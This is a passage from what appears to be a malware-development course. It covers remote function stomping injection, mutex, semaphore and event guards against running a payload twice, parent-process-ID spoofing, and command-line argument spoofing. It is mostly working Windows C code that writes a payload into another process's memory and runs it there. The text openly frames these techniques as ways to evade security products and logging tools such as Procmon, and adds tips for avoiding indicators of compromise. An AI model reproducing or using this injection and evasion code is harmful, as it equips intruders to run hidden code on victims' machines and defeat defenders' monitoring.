	if (hThread != NULL)
		WaitForSingleObject(hThread, INFINITE);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;

}

```

### Demo

Retrieving??`SetupScanFileQueueA`'s address.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/stomp-109438900-53f68143-4143-4be4-978c-4c38e9b4f0d4.png)

  

The original bytes of the??`SetupScanFileQueueA`??function.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/stomp-209438901-b436065b-17a9-43b2-86a9-da708329b4c7.png)

  

Replacing the function's bytes with the Msfvenom calc payload.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/stomp-309438902-a96c9c50-7ac1-42f9-918f-992a2ef749d6.png)  

Running the payload.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/stomp-409438904-bfacfa89-e6cb-4903-9cd1-7a55c9b66697.png)
# 5.3 Remote Function Stomping Injection

### Introduction

The previous module introduced function stomping on the local address space of the process. In this module, the same implementation logic will be used to inject code into a remote process.

### Remote Function Stomping

The DLLs that implement Windows API functions are shared across all processes that use them, therefore, the functions within the DLL have the same address in each process. However, the address of the DLL itself will differ between processes due to the different virtual address spaces. This means that while the address of the target function remains constant across different processes, the DLL which exports these functions may not be the same.

For example, two processes, A and B, will be sharing??`Kernel32.dll`??but the address of the DLL may be different within each process due to??[Address Space Layout Randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization). However,??`VirtualAlloc`, which is exported from??`Kernel32.dll`, will have the same address in both processes.

It is important to note that in order for function stomping to be performed remotely, the DLL that exports the targeted function must already be loaded into the target process. For example, to target the??`SetupScanFileQueueA`??function in a remote function, which is exported from??`Setupapi.dll`, that DLL must already be loaded into the target process. If the remote process does not have??`Setupapi.dll`??loaded, the??`SetupScanFileQueueA`??function will not be present in the target process, resulting in an attempt to write to an address that does not exist.

### Remote Function Stomping Code

The following code is similar to the local function stomping code, however, it uses different WinAPI functions to carry out code injection.

```c

#define		SACRIFICIAL_DLL            "setupapi.dll"
#define		SACRIFICIAL_FUNC           "SetupScanFileQueueA"

// ...

BOOL WritePayload(HANDLE hProcess, PVOID pAddress, PBYTE pPayload, SIZE_T sPayloadSize) {

	DWORD	dwOldProtection            = NULL;
	SIZE_T	sNumberOfBytesWritten      = NULL;

	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx [RW] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten) || sPayloadSize != sNumberOfBytesWritten){
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[!] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}

	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx [RWX] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}


int wmain(int argc, wchar_t* argv[]) {

	HANDLE		hProcess		= NULL,
		        hThread			= NULL;
	PVOID		pAddress		= NULL;
	DWORD		dwProcessId		= NULL;

	HMODULE		hModule			= NULL;

	if (argc < 2) {
		wprintf(L"[!] Usage : \"%s\" <Process Name> \n", argv[0]);
		return -1;
	}

	wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", argv[1]);
	if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
		printf("[!] Process is Not Found \n");
		return -1;
	}
	printf("[+] DONE \n");
	printf("[i] Found Target Process Pid: %d \n", dwProcessId);

	

	printf("[i] Loading \"%s\"... ", SACRIFICIAL_DLL);
	hModule = LoadLibraryA(SACRIFICIAL_DLL);
	if (hModule == NULL) {
		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
		return -1;
	}
	printf("[+] DONE \n");


	pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
	if (pAddress == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return -1;
	}
	printf("[+] Address Of \"%s\" : 0x%p \n", SACRIFICIAL_FUNC, pAddress);


	printf("[#] Press <Enter> To Write Payload ... ");
	getchar();
	printf("[i] Writing ... ");
	if (!WritePayload(hProcess, pAddress, Payload, sizeof(Payload))) {
		return -1;
	}
	printf("[+] DONE \n");

	

	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();

	hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
	if (hThread != NULL)
		WaitForSingleObject(hThread, INFINITE);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}


```

### Demo

Targeting??`Notepad.exe`??process.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/remote-stomp-109445015-30dbf6a1-2ece-4d4c-a304-a9fc12f8f231.png)

  

Retrieving??`SetupScanFileQueueA`'s address.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/remote-stomp-209445031-a0b9b825-93f8-429c-a6eb-5dc4e276e2df.png)

  

The original bytes of the??`SetupScanFileQueueA`??function.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/remote-stomp-309445021-d9ccc1af-1eb5-4e9e-ba62-8f67b3442c90.png)

  

Replacing the function's bytes with the Msfvenom calc payload.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/remote-stomp-409445036-d03ad29c-8eb0-4b5a-b166-bd30458dbe1a.png)

  

Running the payload.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/remote-stomp-509445038-6bb55397-dbac-4546-b1d7-2a7be0744c8a.png)
# 5.4 Payload Execution Control

### Introduction

In real-world scenarios, it is important to limit the actions performed by a malware and focus on essential tasks. The more actions performed by the malware, the more likely it'll be picked up by monitoring systems.

[Windows Synchronization Objects](https://learn.microsoft.com/en-us/windows/win32/sync/synchronization-objects)??can be utilized to control the execution of a payload. These objects coordinate the access of shared resources by multiple threads or processes, ensuring that shared resources are accessed in a controlled manner and preventing conflicts or race conditions when multiple threads or processes attempt to access the same resource simultaneously. By using synchronization objects, it's possible to control the number of times the payload is executed on a system.

There are several types of synchronization objects, including??[semaphores](https://learn.microsoft.com/en-us/windows/win32/sync/semaphore-objects),??[mutexes](https://learn.microsoft.com/en-us/windows/win32/sync/mutex-objects), and??[events](https://learn.microsoft.com/en-us/windows/win32/sync/event-objects). Each type of synchronization object works in a slightly different manner but ultimately they all serve the same purpose which is to coordinate access of shared resources.

### Semaphores

[Semaphores](https://learn.microsoft.com/en-us/windows/win32/sync/semaphore-objects)??are synchronization tools that utilize a value stored in memory to control access to a shared resource. There are two types of semaphores: binary and counting. A binary semaphore has a value of 1 or 0, indicating whether the resource is available or unavailable, respectively. A counting semaphore, on the other hand, has a value greater than 1, representing the number of available resources or the number of processes that can access the resource concurrently.

To control execution of a payload, a named semaphore object will be created each time the payload is executed. If the binary is executed multiple times, the first execution will create the named semaphore and the payload will be executed as intended. On subsequent executions, the semaphore creation will fail as the semaphore with the same name is already running. This indicates that the payload is currently being executed from a previous run and therefore should not be run again to avoid duplication.

[CreateSemaphoreA](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createsemaphorea)??will be used to create a semaphore object. It is important to create it as a named semaphore to prevent executions after the initial binary run. If the named semaphore is already running,??`CreateSemaphoreA`??will return a handle to the existing object and??`GetLastError`??will return??`ERROR_ALREADY_EXISTS`. In the code below, if a "ControlString" semaphore is already running,??`GetLastError`??will return??`ERROR_ALREADY_EXISTS`.

```c
HANDLE hSemaphore = CreateSemaphoreA(NULL, 10, 10, "ControlString");

if (hSemaphore != NULL && GetLastError() == ERROR_ALREADY_EXISTS)
	// Payload is already running
else
	// Payload is not running

```

### Mutexes

A??[Mutex](https://learn.microsoft.com/en-us/windows/win32/sync/mutex-objects), short for "mutual exclusion", is a synchronization tool used to manage access to shared resources among processes and threads. In practical use, a thread attempting to access a shared resource checks the status of the mutex. If it is locked, the thread waits until the mutex is unlocked before proceeding. If the mutex is not locked, the thread locks it, performs the necessary operations on the shared resource, and then unlocks the mutex upon completion. This ensures that only one thread can access the shared resource at a time, preventing conflicts and data corruption.

[CreateMutexA](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createmutexa)??is used to created a named mutex as follows:

```c
HANDLE hMutex = CreateMutexA(NULL, FALSE, "ControlString");

if (hMutex != NULL && GetLastError() == ERROR_ALREADY_EXISTS)
	// Payload is already running
else
	// Payload is not running
```

### Events

[Events](https://learn.microsoft.com/en-us/windows/win32/sync/event-objects)??are another synchronization tool that can be used to coordinate the execution of threads or processes. They can be either manual or automatic, with manual events requiring explicit set or reset actions and automatic events being triggered by external conditions such as timer expiration or task completion.

To use events in a program, the??[CreateEventA](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createeventa)??WinAPI can be employed. The usage of the function is demonstrated below:

```c
HANDLE hEvent = CreateEventA(NULL, FALSE, FALSE, "ControlString");

if (hEvent != NULL && GetLastError() == ERROR_ALREADY_EXISTS)
	// Payload is already running
else
	// Payload is not running
```

### Demo

Using Semaphores.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/control-109459156-0c97cf3a-c176-46da-bd31-afb2d2161b9f.png)

  

Using Mutexes.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/control-209459157-cda5268b-bd34-47ed-874b-a799e0680fb8.png)

  

Using Events.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/control-309459160-66750edb-600a-4fef-a1f2-ef2deec92d5e.png)
# 5.5 Spoofing PPID

### Introduction

[Parent Process ID (PPID) Spoofing](https://attack.mitre.org/techniques/T1134/004/)??is a technique used to alter the PPID of a process, effectively disguising the relationship between the child process and its true parent process. This can be accomplished by changing the PPID of the child process to a different value, making it appear as though the process was spawned by a different legitimate Windows process rather than the true parent process.

Security solutions and defenders will often look for abnormal parent-child relationships. For example, if Microsoft Word spawns??`cmd.exe`??this is generally an indicator of malicious macros being executed. If??`cmd.exe`??is spawned with a different PPID then it will conceal the true parent process and instead appear as if it was spawned by a different process.

In the??_Early Bird APC Queue Code Injection_??module,??`RuntimeBroker.exe`??was spawned by??`EarlyBird.exe`??which can be used by security solutions to detect malicious activity.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/demo-109330271-93c3e529-dfea-4868-ad56-48ce90efe172.png)

### Attributes List

An attribute list is a data structure that stores a list of attributes associated with a process or thread. These attributes can include information such as the priority, scheduling algorithm, state, CPU affinity, and memory address space of the process or thread, among other things. Attribute lists can be used to efficiently store and retrieve information about processes and threads, as well as to modify the attributes of a process or thread at runtime.

PPID Spoofing requires the use and manipulation of a process's attributes list to modify its PPID. The use and modification of a process's attributes list will be shown in the upcoming sections.

### Creating a Process

The process of spoofing PPID requires the creation of a process using??`CreateProcess`??with the??[EXTENDED_STARTUPINFO_PRESENT](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags#flags)??flag being set which is used to give further control of the created process. This flag allows some information about the process to be modified, such as the PPID information. Microsoft's documentation on??`EXTENDED_STARTUPINFO_PRESENT`??states the following:

_The process is created with extended startup information; the lpStartupInfo parameter specifies a STARTUPINFOEX structure._

This means that the??[STARTUPINFOEXA](https://learn.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa)??data structure is also necessary.

### STARTUPINFOEXA Structure

The??`STARTUPINFOEXA`??data structure is shown below:

```c
typedef struct _STARTUPINFOEXA {
  STARTUPINFOA                 StartupInfo;
  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList; // Attributes List
} STARTUPINFOEXA, *LPSTARTUPINFOEXA;
```

- `StartupInfo`??is the same structure that was used in previous modules to create a new process. Reference??_Early Bird APC Queue Code Injection_??&??_Thread Hijacking - Remote Thread Creation_??for a refresher. The only member that needs to be set is??`cb`??to??`sizeof(STARTUPINFOEX)`.
    
- `lpAttributeList`??is created using the??[InitializeProcThreadAttributeList](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist)??WinAPI. This is the attributes list data structure which is discussed in more detail in the following section.
    

### Initializing The Attributes List

The??`InitializeProcThreadAttributeList`??function is shown below.

```c
BOOL InitializeProcThreadAttributeList(
  [out, optional] LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [in]            DWORD                        dwAttributeCount,
                  DWORD                        dwFlags, 		// NULL (reserved)
  [in, out]       PSIZE_T                      lpSize
);
```

To pass an attribute list that modifies the parent process of the created child process, first create the attribute list using the??`InitializeProcThreadAttributeList`??WinAPI. This API initializes a specified list of attributes for process and thread creation. According to Microsoft's documentation,??`InitializeProcThreadAttributeList`??must be called twice:

1. The first call to??`InitializeProcThreadAttributeList`??should be??`NULL`??for the??`lpAttributeList`??parameter. This call is used to determine the size of the attribute list which will be received from the??`lpSize`??parameter.
    
2. The second call to??`InitializeProcThreadAttributeList`??should specify a valid pointer for the??`lpAttributeList`??parameter. The value of??`lpSize`??should be provided as input this time. This call is the one that initializes the attributes list.
    

`dwAttributeCount`??will be set to 1 since only one attribute list is needed.

### Updating The Attributes List

Once the attribute list has been successfully initialized, use the??[UpdateProcThreadAttribute](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)??WinAPI to add attributes to the list. The function is shown below.

```c
BOOL UpdateProcThreadAttribute(
  [in, out]       LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,   // return value from InitializeProcThreadAttributeList 
  [in]            DWORD                        dwFlags,           // NULL (reserved)
  [in]            DWORD_PTR                    Attribute,
  [in]            PVOID                        lpValue,           // pointer to the attribute value
  [in]            SIZE_T                       cbSize,            // sizeof(lpValue)
  [out, optional] PVOID                        lpPreviousValue,   // NULL (reserved)
  [in, optional]  PSIZE_T                      lpReturnSize       // NULL (reserved)
);
```

- `Attribute`??- This flag is critical for PPID spoofing and states what should be updated in the attribute list. In this case, it needs to be set to the??`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`??flag to update the parent process information.

The??`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`??flag specifies the parent process of the thread. In general, the parent process of a thread is the process that created the thread. If a thread is created using the??`CreateThread`??function, the parent process is the one that called the??`CreateThread`??function. If a thread is created as part of a new process using the??`CreateProcess`??function, the parent process is the new process. Updating the parent process of a thread will also update the parent process of the associated process.

- `lpValue`??- The handle of the parent process.
    
- `cbSize`??- The size of the attribute value specified by the??`lpValue`??parameter. This will be set to??`sizeof(HANDLE)`.
    

### Implementation Logic

The steps below sum up the required actions to perform PPID spoofing.

1. `CreateProcessA`??is called with the??`EXTENDED_STARTUPINFO_PRESENT`??flag to provide further control over the created process.
    
2. The??`STARTUPINFOEXA`??structure is created which contains the attributes list,??`LPPROC_THREAD_ATTRIBUTE_LIST`.
    
3. `InitializeProcThreadAttributeList`??is called to initialize the attributes list. The function must be called twice, the first time determines the size of the attributes list and the next call is the one that performs the initialization.
    
4. `UpdateProcThreadAttribute`??is used to update the attributes by setting the??`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`??flag which allow the user to specify the parent process of the thread.
    

### PPID Spoofing Function

`CreatePPidSpoofedProcess`??is a function that creates a process with a spoofed PPID. The function takes 5 arguments:

- `hParentProcess`??- A handle to the process that will become the parent of the newly created process.
    
- `lpProcessName`??- The name of the process to create.
    
- `dwProcessId`??- A pointer to a DWORD that receives the newly created process's PID.
    
- `hProcess`??- A pointer to a HANDLE that receives a handle to the newly created process.
    
- `hThread`??- A pointer to a HANDLE that receives a handle to the newly created process's thread.
    

```c
BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	CHAR                               lpPath               [MAX_PATH * 2];
	CHAR                               WnDr                 [MAX_PATH];

	SIZE_T                             sThreadAttList       = NULL;
	PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList       = NULL;

	STARTUPINFOEXA                     SiEx                = { 0 };
	PROCESS_INFORMATION                Pi                  = { 0 };

	RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	
	//-------------------------------------------------------------------------------
	
	// This will fail with ERROR_INSUFFICIENT_BUFFER, as expected
	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);	

	// Allocating enough memory
	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
	if (pThreadAttList == NULL){
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Calling InitializeProcThreadAttributeList again, but passing the right parameters
	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
		printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Setting the LPPROC_THREAD_ATTRIBUTE_LIST element in SiEx to be equal to what was
	// created using UpdateProcThreadAttribute - that is the parent process
	SiEx.lpAttributeList = pThreadAttList;

	//-------------------------------------------------------------------------------

	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		&SiEx.StartupInfo,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}


	*dwProcessId	= Pi.dwProcessId;
	*hProcess		= Pi.hProcess;
	*hThread		= Pi.hThread;


	// Cleaning up
	DeleteProcThreadAttributeList(pThreadAttList);
	CloseHandle(hParentProcess);

	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}
```

### Demo

Creating the child process,??`RuntimeBroker.exe`, with parent??`svchost.exe`??that has a PID of??`21956`. Note that this??`svchost.exe`??process is running with normal privileges.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/ppid-spoofing-1209528890-4c267ff2-a7b9-4036-8279-a5af58f067c7.png)

  

PPID Spoofing is successful. The??`RuntimeBroker.exe`??process appears as if it was spawned by??`svchost.exe`.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/ppid-spoofing-209529234-c72226c9-0cf1-401f-b46d-6b32cb1bac25.png)

  

### Demo 2 - Updating Current Directory

Notice in the previous demo how the "Current Directory" value points to the directory of the??`PPidSpoofing.exe`??binary.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/ppid-spoofing-309529480-978dfe1a-ba61-4881-a33d-9614bd7ee3bb.png)

  

This can easily be an IoC and security solutions or defenders may quickly flag this anomaly. To fix this, simply set the??`lpCurrentDirectory`??parameter in??`CreateProcess`??WinAPI to a less suspicious directory, such as "C:\Windows\System32".

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/ppid-spoofing-409530891-f8b81cc4-8cec-4ffe-b413-debf5f051ae8.png)
# 5.6 Process Argument Spoofing (1)

### Introduction

Process argument spoofing is a technique used to conceal the command line argument of a newly spawned process in order to facilitate the execution of commands without revealing them to logging services, such as??[Procmon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon).

The image below shows the command??`powershell.exe -c calc.exe`??being logged by Procmon. The objective of this module is to run??`powershell.exe -c calc.exe`??without it being successfully logged to Procmon.

![Image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/arg-spoof-109550005-441b53e8-9f32-48c3-96a5-56b5b7eb427a.png)

### PEB Review

The first step to performing argument spoofing is to understand where the arguments are being stored inside the process. Recall the??[PEB structure](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)??which was explained at the start of the course, it holds information about a process. To be more specific, the??[RTL_USER_PROCESS_PARAMETERS](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters)??structure inside the PEB contains the??`CommandLine`??member which holds the command line arguments. The??`RTL_USER_PROCESS_PARAMETERS`??structure is shown below.

```c
typedef struct _RTL_USER_PROCESS_PARAMETERS {
  BYTE           Reserved1[16];
  PVOID          Reserved2[10];
  UNICODE_STRING ImagePathName;
  UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
```

`CommandLine`??is defined as a??[UNICODE_STRING](https://learn.microsoft.com/en-us/windows/win32/api/subauth/ns-subauth-unicode_string).

### UNICODE_STRING Structure

The??`UNICODE_STRUCTURE`??structure is shown below.

```c
typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
```

The??`Buffer`??element will contain the contents of the command line arguments. With this in mind, it's possible to access the command line arguments using??`PEB->ProcessParameters.CommandLine.Buffer`??as a wide-character string.

### How To Spoof Process Arguments

To perform spoofing of command line arguments, one must first create a target process in a suspended state, passing dummy arguments that are not considered suspicious. Before resuming the process, the??`PEB->ProcessParameters.CommandLine.Buffer`??string needs to be patched with the desired payload string, which will cause logging services to log the dummy arguments instead of the actual command line arguments that are going to be executed. To carry out this procedure, the following steps must be taken:

1. Create the target process in a suspended state.
    
2. Get the remote??`PEB`??address of the created process.
    
3. Read the remote??`PEB`??structure from the created process.
    
4. Read the remote??`PEB->ProcessParameters`??structure from the created process.
    
5. Patch the string??`ProcessParameters.CommandLine.Buffer`, and overwrite with the payload to execute.
    
6. Resume the process.
    

The length of the payload argument written to??`Peb->ProcessParameters.CommandLine.Buffer`??at runtime must be smaller than or equal to the length of the dummy argument created during the suspended process creation. If the real argument is larger, it may overwrite bytes outside the dummy argument, resulting in the process crashing. To avoid this, always ensure that the dummy argument is larger than the argument that will be executed.

### Retrieving Remote PEB Address

Retrieving the PEB address of the remote process requires the use of??[NtQueryInformationProcess](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess)??with the??`ProcessBasicInformation`??flag.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/arg-spoof-209553208-efe6e1fb-2e03-4840-a1ff-821217ddf731.png)

As noted in the documentation, when the??`ProcessBasicInformation`??flag is used,??`NtQueryInformationProcess`??will return a??`PROCESS_BASIC_INFORMATION`??structure that looks like this:

```c
typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS    ExitStatus;
    PPEB        PebBaseAddress;                // Points to a PEB structure.
    ULONG_PTR   AffinityMask;
    KPRIORITY   BasePriority;
    ULONG_PTR   UniqueProcessId;
    ULONG_PTR   InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;
```

Note that since??`NtQueryInformationProcess`??is a syscall it needs to be called using??`GetModuleHandle`??and??`GetProcAddress`??as shown in previous modules.

### Reading Remote PEB Structure

After retrieving the PEB address for the remote process, it's possible to read the PEB structure using??[ReadProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory)??WinAPI which is shown below.

```c
BOOL ReadProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPCVOID lpBaseAddress,
  [out] LPVOID  lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesRead
);
```

`ReadProcessMemory`??is used to read data from a specified address that is specified in the??`lpBaseAddress`??parameter. The function must be invoked twice:

1. The first invocation is used to read the PEB structure by passing the PEB address obtained from??`NtQueryInformationProcess`'s output. This is passed in the??`lpBaseAddress`??parameter.
    
2. It is then invoked a second time to read the??`RTL_USER_PROCESS_PARAMETERS`??structure, passing its address to the??`lpBaseAddress`??parameter. Note that??`RTL_USER_PROCESS_PARAMETERS`??is found within the PEB structure during the first invocation. Recall that this structure contains the??`CommandLine`??member which is required to perform argument spoofing.
    

#### RTL_USER_PROCESS_PARAMETERS Size

When reading the??`RTL_USER_PROCESS_PARAMETERS`??structure, it is necessary to read more bytes than??`sizeof(RTL_USER_PROCESS_PARAMETERS)`. This is because the real size of this structure depends on the dummy argument's size. To ensure the entire structure is read, additional bytes should be read. This is done in the code sample where an additional 225 bytes are read.

### Patching CommandLine.Buffer

Having obtained the??`RTL_USER_PROCESS_PARAMETERS`??structure, it's possible to access and patch??`CommandLine.Buffer`. To do so,??[WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)??WinAPI will be used, which is shown below.

```c
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,          // What is being overwritten (CommandLine.Buffer)
  [in]  LPCVOID lpBuffer,               // What is being written (new process argument)
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```

- `lpBaseAddress`??should be set to what is being overwritten, which in this case is??`CommandLine.Buffer`.
    
- `lpBuffer`??is the data that will be overwriting the dummy arguments. It should be a wide char string to replace??`CommandLine.Buffer`??which is also a wide char string.
    
- The??`nSize`??parameter is the size of the buffer to write in??_bytes_. It should be equal to the length of the string that's being written multiplied by the size of??`WCHAR`??plus 1 (for the null character).
    

```c
lstrlenW(NewArgument) * sizeof(WCHAR) + 1
```

### Helper Functions

The code in this module makes use of two helper functions that read and write from and to the target process.

#### ReadFromTargetProcess Function

The??`ReadFromTargetProcess`??helper function will return an allocated heap that contains the buffer read from the target process. First it will read the PEB structure and then use it to retrieve the??`RTL_USER_PROCESS_PARAMETERS`??structure. The??`ReadFromTargetProcess`??function is shown below.

```c
BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN DWORD dwBufferSize) {

	SIZE_T	sNmbrOfBytesRead	= NULL;

	*ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);
	
	if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize){
		printf("[!] ReadProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[i] Bytes Read : %d Of %d \n", sNmbrOfBytesRead, dwBufferSize);
		return FALSE;
	}

	return TRUE;
}
```

#### WriteToTargetProcess Function

The??`WriteToTargetProcess`??helper function will pass the appropriate parameters to??`WriteProcessMemory`??and check the output. The??`WriteToTargetProcess`??function is shown below.

```c
BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN DWORD dwBufferSize) {

	SIZE_T sNmbrOfBytesWritten	= NULL;

	if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[i] Bytes Written : %d Of %d \n", sNmbrOfBytesWritten, dwBufferSize);
		return FALSE;
	}

	return TRUE;
}
```

### Process Argument Spoofing Function

`CreateArgSpoofedProcess`??is a function that performs argument spoofing on a newly created process. The function requires 5 arguments:

- `szStartupArgs`??- The dummy arguments. These should be benign.
    
- `szRealArgs`??- The real arguments to execute.
    
- `dwProcessId`??- A pointer to a DWORD that receives the PID.
    
- `hProcess`??- A pointer to a HANDLE that receives the process handle.
    
- `hThread`??- A pointer to a DWORD that receives the process's thread handle.
    

```c
BOOL CreateArgSpoofedProcess(IN LPWSTR szStartupArgs, IN LPWSTR szRealArgs, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	NTSTATUS                      STATUS   = NULL;

	WCHAR                         szProcess [MAX_PATH];

	STARTUPINFOW                  Si       = { 0 };
	PROCESS_INFORMATION           Pi       = { 0 };

	PROCESS_BASIC_INFORMATION     PBI      = { 0 };
	ULONG                         uRetern  = NULL;

	PPEB                          pPeb     = NULL;
	PRTL_USER_PROCESS_PARAMETERS  pParms   = NULL;


	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	Si.cb = sizeof(STARTUPINFOW);

	// Getting the address of the NtQueryInformationProcess function
	fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");
	if (pNtQueryInformationProcess == NULL) 
		return FALSE;


	lstrcpyW(szProcess, szStartupArgs);

	if (!CreateProcessW(
		NULL,
		szProcess,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,      // creating the process suspended & with no window
		NULL,
		L"C:\\Windows\\System32\\",               // we can use GetEnvironmentVariableW to get this Programmatically
		&Si,
		&Pi)) {
		printf("\t[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}


	// Getting the PROCESS_BASIC_INFORMATION structure of the remote process which contains the PEB address
	if ((STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uRetern)) != 0) {
		printf("\t[!] NtQueryInformationProcess Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	
